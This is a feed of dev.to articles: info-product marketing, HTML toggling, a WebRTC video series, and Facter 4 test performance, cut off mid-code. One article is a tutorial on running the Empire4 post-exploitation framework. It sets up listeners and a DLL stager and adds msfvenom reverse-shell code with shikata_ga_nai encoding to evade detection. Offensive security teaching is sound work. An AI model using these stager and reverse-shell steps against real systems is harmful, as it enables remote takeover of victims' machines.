&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--TCfVEt5C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t65ovpk5n7nrg9xiejb9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--TCfVEt5C--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/t65ovpk5n7nrg9xiejb9.png" alt="SaaS eBook earnings for the first 6 months" width="880" height="522"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Your info products can be your little money-making machines once you set them up.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;But what is an info product?&lt;/li&gt;
&lt;li&gt;How much should I sell it for?&lt;/li&gt;
&lt;li&gt;How do I sell them?&lt;/li&gt;
&lt;li&gt;Whom do I sell them to?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You may have these questions in your head right now. Let’s answer all of these.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-an-info-product"&gt;
  &lt;/a&gt;
  What is an info product?
&lt;/h2&gt;

&lt;p&gt;An info product is any piece of knowledge/content that’s packaged either as an eBook, video, recording, etc.&lt;/p&gt;

&lt;p&gt;If you think you know something that others don’t, you can put together an info product and there are countless people willing to pay you to learn what you already know!&lt;/p&gt;

&lt;p&gt;For example, let’s say you are good at copywriting. You know how to write content that sells products. You can package all of your knowledge into an info product and start selling.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-big-an-info-product-should-be"&gt;
  &lt;/a&gt;
  How big an info product should be?
&lt;/h2&gt;

&lt;p&gt;There is no hard and fast rule here.&lt;/p&gt;

&lt;p&gt;It can be as small as a 20-page eBook, or a 30-minute video tutorial. Or it can be as big as a 300–500 pages eBook or a full-fledged video tutorial of 8–10 hours.&lt;/p&gt;

&lt;p&gt;Now, these are some of the important questions to consider before you start creating an info product.&lt;/p&gt;

&lt;p&gt;Can you create an info product for every topic you know about? — Yes&lt;/p&gt;

&lt;p&gt;Can you sell every info product you create? — Yes&lt;/p&gt;

&lt;p&gt;But can you sell thousands of them? — Probably not.&lt;/p&gt;

&lt;p&gt;Chances are there are many info products already created by other experts. You need a product that is unique to scale this business. You should bring something unique to the table if you want to stand out.&lt;/p&gt;

&lt;p&gt;For example, talk about the strategies that have worked for you.&lt;/p&gt;

&lt;p&gt;Work on something, experiment, and make it work for yourself first. Then create an info product teaching others how to do the same and replicate your success. Since you are sharing your own journey, chances are the product will sell better.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-much-should-you-sell-an-info-product-for"&gt;
  &lt;/a&gt;
  How much should you sell an info product for?
&lt;/h2&gt;

&lt;p&gt;Pricing is tricky when it comes to info products.&lt;/p&gt;

&lt;p&gt;The best way to go about it is:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Research how much similar products are sold for&lt;/li&gt;
&lt;li&gt;Price your product in the same range&lt;/li&gt;
&lt;li&gt;See how it does&lt;/li&gt;
&lt;li&gt;Tweak (increase or decrease) it until you find the sweet spot that sells best&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;There is no hard and fast rule when it comes to pricing. Keep experimenting with price and see what works best for you.&lt;/p&gt;

&lt;p&gt;And another great way to make more sales often is to run offers every now and then. Please love discounts. Take advantage of holidays.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#where-do-you-sell-info-products"&gt;
  &lt;/a&gt;
  Where do you sell info products?
&lt;/h2&gt;

&lt;p&gt;The best way to go about it is to set up your own landing page with payments integration (Stripe) and start selling. But if you don’t want to do it all on your own, there are platforms like Gumroad that make it really easy for creators.&lt;/p&gt;

&lt;p&gt;There are many other platforms like Udemy, AppSumo, etc.&lt;/p&gt;

&lt;p&gt;But pick one platform that provides the features you are looking for and stick with it. I currently sell my SaaS eBooks on Gumroad.&lt;/p&gt;

&lt;p&gt;It provides everything I need:&lt;br&gt;
Payments — Emails — Analytics — Affiliate program, etc&lt;/p&gt;

&lt;p&gt;Now the big question is “Who will buy my info products”?&lt;/p&gt;

&lt;p&gt;You should get traffic to your product to sell more of it.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-do-you-get-traffic"&gt;
  &lt;/a&gt;
  How do you get traffic?
&lt;/h2&gt;

&lt;p&gt;There are multiple ways to generate traffic to your product landing page. Let’s talk about 2 main ways here.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;One way is to have a good online presence on different social media platforms. Having credibility among your followers will make them buy your paid products. But building an online presence takes a lot of hard work, dedication, &amp;amp; patience. You need to establish your authority in a specific niche by sharing free content for years. I share my freelancing journey and things that helped me become successful over the years. So selling info products by building an online presence is a long process that takes time.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Another popular way is to run ads. Facebook, Instagram, and Google are some of the popular platforms which provide ads service. Learn how to run effective ads to hook users onto your offer and build a killer landing page that converts.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once you have an info product to sell, you can run great ad campaigns and start making money every single day with no effort.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;Selling info products is one of the most popular ways through which people are making a shit ton of money passively!&lt;br&gt;
Isn’t that a dream?&lt;/p&gt;

&lt;p&gt;What are you waiting for? Go ahead and start creating your first info product!&lt;/p&gt;

&lt;p&gt;If you like this article, follow me on &lt;a href="https://twitter.com/sunilc_"&gt;Twitter&lt;/a&gt; and &lt;a href="https://instagram.com/_sunilc"&gt;Instagram&lt;/a&gt; where I create content on freelancing, making money on the internet as a software developer.&lt;/p&gt;




&lt;p&gt;The article was originally published on my blog &lt;a href="https://sunilkumarc.in/i-spent-35-hours-writing-an-ebook-and-earned-dollar2723-in-the-first-6-months"&gt;here&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>career</category>
      <category>saas</category>
      <category>beginners</category>
      <category>books</category>
    </item>
    <item>
      <title>Using Empire4 without Kali</title>
      <author>Paula</author>
      <pubDate>Sat, 22 Jan 2022 10:18:51 +0000</pubDate>
      <link>https://dev.to/terceranexus6/using-empire4-without-kali-2j5k</link>
      <guid>https://dev.to/terceranexus6/using-empire4-without-kali-2j5k</guid>
      <description>&lt;p&gt;I've found a lot of information on how to use Empire4 on Kali, but Kali itself is a little messy, and I wanted to use it in my own simple, Debian based server and device. After testing and playing around I decided to write about it.&lt;/p&gt;

&lt;p&gt;First of all, &lt;a href="https://github.com/BC-SECURITY/Empire"&gt;Empire4&lt;/a&gt; is a post-exploitation framework, such as Cobalt Strike, Covenant or Meterpreter. It actually rely a lot on Meterpreter, as I will explain later. This means it allows you to deploy listeners in your server and configure attacks connected to them. Empire itself was active for so many years and became deprecated, then Empire4 came up using updated resources. It's open source and it's used for both threat actors (cybercriminals) and offensive security auditors, as well as students of course. &lt;/p&gt;

&lt;p&gt;For configuring it, I decided to use both my VPS and my personal device, since anyway I need to deploy a server and a client instances. Empire4 uses Poetry to launch. &lt;a href="https://python-poetry.org/"&gt;Poetry&lt;/a&gt; is a tool for dependency management and packaging in Python. Empire uses this library which also deploys under Python3.9. I made sure to install that version (as well as the correspondent pip version). If installing version 3.9 of pip is not working, it use in order to get poetry can be forced through:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;sudo python3.9 -m pip install poetry
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It may require an additional library depending on the OS, I needed &lt;code&gt;urllib2&lt;/code&gt; library, which I installed using the same trick from above. In order to make the deploy on the clien side work, I need to configure the server on &lt;code&gt;/empire/client/config.yaml&lt;/code&gt;, in which &lt;code&gt;localhost&lt;/code&gt; is already installed and there are a couple of mock server examples. I used that slot to put my server IP and configure the name:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;...
servers:
localhost:
host: https://localhost
port: 1337
socketport: 5000
username: empireadmin
password: password123
autoconnect: true
&amp;lt;NAME&amp;gt;:
host: https://&amp;lt;server IP&amp;gt;
port: 1337
socketport: 5000
username: empireadmin
password: &amp;lt;mypassword&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And finally one last step before using the client side. Configuring a cert key pair. Fortunately the Empire4 repository already has a script for that so only thing that is needed is to execute:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;sudo ./setup/cert.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And maybe move the certs to your desired location. If you want to create the certs on your own that's fine too, the location will be asked later to be set manually. Okay, now if the python3.9 and its correspondent Poetry version as well as the rest libraries needed is solved, next step is to start the server.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;poetry run python3 empire.py server
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once the server started we can connect through the client, using the configuration we set in &lt;code&gt;/empire/client/config.yaml&lt;/code&gt;, in my case I will connect to myserver.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;poetry run python3 empire.py client
...
(Empire:) connect -c myserver
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8z7_O7mC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/501gpkayrinzmcycln3q.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8z7_O7mC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/501gpkayrinzmcycln3q.png" alt="Image description" width="823" height="491"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once it's up and running, now we can set a listener to work with. The grammar changed a little bit since regular empire. We will use:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;(Empire:) listeners
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To list the listeners if there are any and:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;(Empire:) uselistener http
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To set up a http listener. There are other templates, as well. &lt;/p&gt;

&lt;p&gt;Now to make it work, we need to configure the options that are shown related to the listener. Specially the &lt;code&gt;CertPath&lt;/code&gt;, which is related to the key pair previously generated. So:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;(Empire: uselistener/http) &amp;gt; set CertPath &amp;lt;/path/where/your/keypair/is&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We can also change anything else in case the default options are not satisfactory. Once the setup us done, the command to deploy is &lt;code&gt;execute&lt;/code&gt;. Once the listener is up and running we can use some Stagers and start messing around, for example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;(Empire:) usestager windows/dll http
(Empire: usestager/windows/dll) &amp;gt; set Listener http
[*] Set Listener to http
(Empire: usestager/windows/dll) &amp;gt; execute
[+] launcher.dll written to ...

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now, I realized that some modules take advantage of &lt;code&gt;msfvenom&lt;/code&gt; to work. The &lt;code&gt;msfvenom&lt;/code&gt; tool is the Meterpreter payload generator. This is the case of the reverse shell generator. The default configuration of the module distinguish among architechtures but doesn't obfuscate the output in any case. I decided to &lt;a href="https://github.com/terceranexus6/Empire/blob/master/empire/server/stagers/windows/reverseshell.py"&gt;make some changes&lt;/a&gt; in &lt;a href="https://github.com/terceranexus6/Empire/"&gt;my own fork&lt;/a&gt; in order to use SGN encoder with x86 architecture, as you can se bellow in &lt;code&gt;empire/server/stagers/windows/reverseshell.py&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;...
        if (arch == "x64"):
            msf_payload = "windows/x64/shell_reverse_tcp"
            # generate the msfvenom command
            msf_command = f'msfvenom -p {msf_payload} LHOST={lhost} LPORT={lport} -f {msf_format}'
        else:
            print("[*] Using Shikata ga nai for this architechture")
            msf_payload = "windows/shell_reverse_tcp"
            # generate the msfvenom command with SGN
            msf_command = f'msfvenom -a {arch} --platform windows -p {msf_payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -f {msf_format}'
...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If &lt;code&gt;msfvenom&lt;/code&gt; is already initiated at least once in the server, the changes work perfectly and the stager is encoded while using x86 architecture. Anyway this way is way clearer for me than using Starkiller, and if, as well as myself, you are not a fan of Kali OS, I hope this is somehow helpful.&lt;/p&gt;

</description>
      <category>cybersecurity</category>
      <category>empire</category>
      <category>python</category>
      <category>linux</category>
    </item>
    <item>
      <title>Hide or show Elements/div in HTML Using JavaScript and Css
</title>
      <author>Shaswat Raj</author>
      <pubDate>Sat, 22 Jan 2022 10:11:41 +0000</pubDate>
      <link>https://dev.to/sh20raj/hide-or-show-elementsdiv-in-html-using-javascript-and-css-3jb7</link>
      <guid>https://dev.to/sh20raj/hide-or-show-elementsdiv-in-html-using-javascript-and-css-3jb7</guid>
      <description>&lt;ul&gt;
&lt;li&gt;Video Documentation :- &lt;a href="https://youtu.be/Ms7EgAJDVx0"&gt;https://youtu.be/Ms7EgAJDVx0&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Source :- &lt;a href="https://codexdindia.blogspot.com/2022/01/hide-or-show-elements-in-html-using-javascript-and-css.html"&gt;https://codexdindia.blogspot.com/2022/01/hide-or-show-elements-in-html-using-javascript-and-css.html&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;Steps :-&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;For This Firstly create a .hidden class where the css display property is set to &lt;code&gt;"none"&lt;/code&gt;.
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;style&amp;gt;
  .hidden{
    display:none;
  }
&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;HTML&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Then Using JavaScript we will &lt;code&gt;toggle&lt;/code&gt; (add / remove) the hidden class from the element. So that results hiding and showing of the div/any other  element.&lt;/li&gt;
&lt;li&gt;Creating a JavaScript function to hide/show elements.
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;script&amp;gt;
  function hideunhide(a){
    document.querySelector(a).classList.toggle('hidden');
  }
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;HTML&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;This function takes a parameter (queryselector) and select the element and add or remove hidden from the class list of the element. If hidden is present it will remove and vice-versa.That's the work of toggle.&lt;/li&gt;
&lt;li&gt;See the Demo Below or on CXDI - Tutorials :- &lt;a href="https://tutorials.sh20raj.repl.co/hide-or-show-elements-in-html-using-javascript-and-css/"&gt;https://tutorials.sh20raj.repl.co/hide-or-show-elements-in-html-using-javascript-and-css/&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Demo Codes :- &lt;a href="https://replit.com/@SH20RAJ/Tutorials#hide-or-show-elements-in-html-using-javascript-and-css/index.html"&gt;https://replit.com/@SH20RAJ/Tutorials#hide-or-show-elements-in-html-using-javascript-and-css/index.html&lt;/a&gt; or on Codepen :- &lt;a href="https://codepen.io/SH20RAJ/pen/vYeVdGj?editors=1010"&gt;https://codepen.io/SH20RAJ/pen/vYeVdGj?editors=1010&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>javascript</category>
      <category>css</category>
      <category>sh20raj</category>
      <category>tricks</category>
    </item>
    <item>
      <title>Build a Video Conference App from Scratch using WebRTC,Websocket,PHP +JS Day 15</title>
      <author>ben pobi</author>
      <pubDate>Sat, 22 Jan 2022 10:11:30 +0000</pubDate>
      <link>https://dev.to/benpobi/build-a-video-conference-app-from-scratch-using-webrtcwebsocketphp-js-day-15-4k46</link>
      <guid>https://dev.to/benpobi/build-a-video-conference-app-from-scratch-using-webrtcwebsocketphp-js-day-15-4k46</guid>
      <description>&lt;p&gt;In this video we'll cover how to create ValidateUsername method&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/fCQZ2BQMiG0"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>webrtc</category>
      <category>webdev</category>
      <category>javascript</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Faster module tests with Facter 4 and rspec-puppet</title>
      <author>Gabriel Nagy</author>
      <pubDate>Sat, 22 Jan 2022 10:03:16 +0000</pubDate>
      <link>https://dev.to/puppet/faster-module-tests-with-facter-4-and-rspec-puppet-561e</link>
      <guid>https://dev.to/puppet/faster-module-tests-with-facter-4-and-rspec-puppet-561e</guid>
      <description>&lt;p&gt;The latest major version of &lt;a href="https://github.com/puppetlabs/facter"&gt;Facter&lt;/a&gt;—Puppet's tool for collecting system information—&lt;a href="https://puppet.com/blog/facter-4-back-to-the-roots/"&gt;has been out&lt;/a&gt; for some time now. However, we've been hard at work fixing bugs ever since. The fact that Facter has to be able to run on a variety of operating systems and architectures makes maintenance quite a challenging ordeal.&lt;/p&gt;

&lt;p&gt;Returning to using Ruby as the language of choice (Facter 3 was &lt;a href="https://github.com/puppetlabs/facter/tree/3.x"&gt;written in C++&lt;/a&gt;) meant that we'd have a lot more freedom in structuring and writing the code, mostly at the expense of the added run time. This isn't an issue for how most people use Facter, for example Puppet loads &lt;a href="https://github.com/puppetlabs/puppet/blob/a5a77602a275f1106be9e6a810c5878d08998299/lib/puppet/indirector/facts/facter.rb#L39"&gt;all available facts&lt;/a&gt; at once when it runs, so a few seconds of added run time won't make a difference with Puppet runs that already take minutes. This was something we took into account when making the decision to return to Ruby with Facter 4 (initially Facter was written in Ruby, but was then rewritten in C++ for improved performance). What we didn't take into account were the intricacies of how Facter interacts with other downstream projects that we weren't aware of, such as the &lt;a href="https://rspec-puppet.com/"&gt;rspec-puppet&lt;/a&gt; test framework.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-raw-rspecpuppet-endraw-"&gt;
  &lt;/a&gt;
  What is &lt;code&gt;rspec-puppet&lt;/code&gt;?
&lt;/h2&gt;

&lt;p&gt;Well, RSpec is a well-known test framework for Ruby, and Puppet is... well, you probably already know or you wouldn't be here reading these words.&lt;/p&gt;

&lt;p&gt;rspec-puppet is the tool of choice when writing unit tests for Puppet modules.  It provides a helpful syntax for interacting with Puppet catalogs in an RSpec way. Since it's unfeasible to acceptance test Puppet functionality on dozens of operating systems and versions, rspec-puppet circumvents this by making Facter &lt;em&gt;trick&lt;/em&gt; Puppet into thinking it runs on different OS configurations.&lt;/p&gt;

&lt;p&gt;Puppet gets almost all of its system-related information using facts, so for example if you're running some Linux and you're curious to see how your Puppet manifest would behave on macOS, in most cases it's enough to feed Facter a bunch of macOS facts. Of course, the underlying implementation is more complicated than that, especially for Windows, but in a nutshell this is how rspec-puppet works.&lt;/p&gt;

&lt;p&gt;For each test, rspec-puppet &lt;a href="https://github.com/puppetlabs/rspec-puppet/blob/84a9cfe48257e09061bda565189766cebd03d426/lib/rspec-puppet/support.rb#L482"&gt;stubs the fake facts&lt;/a&gt; using the &lt;a href="https://puppet.com/docs/puppet/latest/custom_facts.html"&gt;custom facts API&lt;/a&gt;. The &lt;em&gt;fake&lt;/em&gt; facts it gets from &lt;a href="https://github.com/voxpupuli/facterdb"&gt;facterdb&lt;/a&gt;, which is a gem that contains "dummy" facts for a variety of operating systems and Facter versions—basically lots of files containing &lt;code&gt;facter --json&lt;/code&gt; output. The resulting information is then fed to Puppet for catalog compilation.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#getting-slower-and-slower"&gt;
  &lt;/a&gt;
  Getting slower and slower...
&lt;/h2&gt;

&lt;p&gt;Over time, &lt;a href="https://tickets.puppetlabs.com/browse/FACT-3039"&gt;people have been noticing&lt;/a&gt; that module tests running with Facter 4 were much slower than Facter 2. Module tests have skipped Facter 3 altogether because even though Facter 3 ships a compatible Ruby module, in the end it's C++ code that's extremely incompatible with the Ruby ecosystem (you can't &lt;code&gt;gem install&lt;/code&gt; it like you would any other gem).&lt;/p&gt;

&lt;p&gt;After some investigation it turned out that Facter 4 was evaluating underlying core facts even though they had been overridden by custom facts. The first instinct would be to classify this as a bug, but a closer look showed us that this functionality was intended in order to be fully-compatible with Facter 3.  And because modules never ran tests with Facter 3 this wasn't a problem until now.&lt;/p&gt;

&lt;p&gt;Overriding a core fact, similar to how rspec-puppet does:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="no"&gt;Facter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:ipaddress&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;weight: &lt;/span&gt;&lt;span class="mi"&gt;999&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="n"&gt;setcode&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;'1.1.1.1'&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;will return the correct value (1.1.1.1) but it will cause Facter to also load the core &lt;code&gt;ipaddress&lt;/code&gt; fact, ultimately resolving all networking facts, which means executing system commands. &lt;/p&gt;

&lt;p&gt;Assuming our custom &lt;code&gt;ipaddress&lt;/code&gt; fact is defined inside the &lt;code&gt;custom_facts&lt;/code&gt; directory, here's what gets called when we attempt to resolve the fact:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nv"&gt;$ FACTERLIB&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PWD&lt;/span&gt;/custom_facts strace &lt;span class="nt"&gt;-f&lt;/span&gt; &lt;span class="nt"&gt;-eexecve&lt;/span&gt; facter ipaddress
&lt;span class="o"&gt;[&lt;/span&gt;pid 1777063] execve&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/usr/bin/ip"&lt;/span&gt;, &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"ip"&lt;/span&gt;, &lt;span class="s2"&gt;"-o"&lt;/span&gt;, &lt;span class="s2"&gt;"link"&lt;/span&gt;, &lt;span class="s2"&gt;"show"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, 0x563bf6b7acf0 /&lt;span class="k"&gt;*&lt;/span&gt; 110 vars &lt;span class="k"&gt;*&lt;/span&gt;/&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0
&lt;span class="o"&gt;[&lt;/span&gt;pid 1777067] execve&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/usr/bin/ip"&lt;/span&gt;, &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"ip"&lt;/span&gt;, &lt;span class="s2"&gt;"link"&lt;/span&gt;, &lt;span class="s2"&gt;"show"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, 0x563bf64eafa0 /&lt;span class="k"&gt;*&lt;/span&gt; 110 vars &lt;span class="k"&gt;*&lt;/span&gt;/&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0
&lt;span class="o"&gt;[&lt;/span&gt;pid 1777068] execve&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/usr/bin/dhcpcd"&lt;/span&gt;, &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"/usr/bin/dhcpcd"&lt;/span&gt;, &lt;span class="s2"&gt;"-U"&lt;/span&gt;, &lt;span class="s2"&gt;"lo"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, 0x563bf6aa57b0 /&lt;span class="k"&gt;*&lt;/span&gt; 110 vars &lt;span class="k"&gt;*&lt;/span&gt;/&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0
&lt;span class="c"&gt;# ... dhcpcd is called for every network interface on the system&lt;/span&gt;
&lt;span class="c"&gt;# I removed the other calls for brevity&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;pid 1777078] execve&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/usr/bin/ip"&lt;/span&gt;, &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"ip"&lt;/span&gt;, &lt;span class="s2"&gt;"route"&lt;/span&gt;, &lt;span class="s2"&gt;"show"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, 0x563bf6aba230 /&lt;span class="k"&gt;*&lt;/span&gt; 110 vars &lt;span class="k"&gt;*&lt;/span&gt;/&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0
&lt;span class="o"&gt;[&lt;/span&gt;pid 1777079] execve&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/usr/bin/ip"&lt;/span&gt;, &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"ip"&lt;/span&gt;, &lt;span class="s2"&gt;"-6"&lt;/span&gt;, &lt;span class="s2"&gt;"route"&lt;/span&gt;, &lt;span class="s2"&gt;"show"&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, 0x563bf6ae37d0 /&lt;span class="k"&gt;*&lt;/span&gt; 110 vars &lt;span class="k"&gt;*&lt;/span&gt;/&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Doing this hundreds or even thousands of times per test suite definitely adds to the increase in run time, and it's redundant since the resolved facts are never needed.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#fixing-things-without-breaking-more-things"&gt;
  &lt;/a&gt;
  Fixing things without breaking more things
&lt;/h2&gt;

&lt;p&gt;Modifying Facter's behavior—undocumented as it was—was a no-go from the start,  as we &lt;a href="https://tickets.puppetlabs.com/browse/FACT-3000"&gt;found out before&lt;/a&gt; (Facter is a good example of &lt;a href="https://www.hyrumslaw.com/"&gt;Hyrum's law&lt;/a&gt; in action). So, we had to think of other ways to improve performance.&lt;/p&gt;

&lt;p&gt;We started by decoupling Puppet from Facter as much as we could, introducing the possibility of having &lt;a href="https://tickets.puppetlabs.com/browse/PUP-11216"&gt;multiple Facter backends&lt;/a&gt;. While Puppet would &lt;a href="https://github.com/puppetlabs/puppet/blob/a5a77602a275f1106be9e6a810c5878d08998299/lib/puppet/runtime.rb#L21"&gt;use&lt;/a&gt; the &lt;a href="https://github.com/puppetlabs/puppet/blob/a5a77602a275f1106be9e6a810c5878d08998299/lib/puppet/facter_impl.rb"&gt;default Facter implementation&lt;/a&gt; when running on its own, external users would be able to define and pass their own Facter implementation when initializing Puppet, similar to how puppetserver configures Puppet to use its JRuby-compliant HTTP client.&lt;/p&gt;

&lt;p&gt;To avoid breaking the Facter API, we ended up &lt;a href="https://github.com/puppetlabs/rspec-puppet/blob/046340805ba8877e34af22be7756ee972da84f9b/lib/rspec-puppet/facter_impl.rb"&gt;implementing an overcomplicated way of interacting with a hash&lt;/a&gt;. Using our dumb Facter backend, custom facts were now simply added to a hash, and querying them would just produce them from the hash if available:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;FacterTestImpl&lt;/span&gt;
  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;initialize&lt;/span&gt;
    &lt;span class="vi"&gt;@facts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

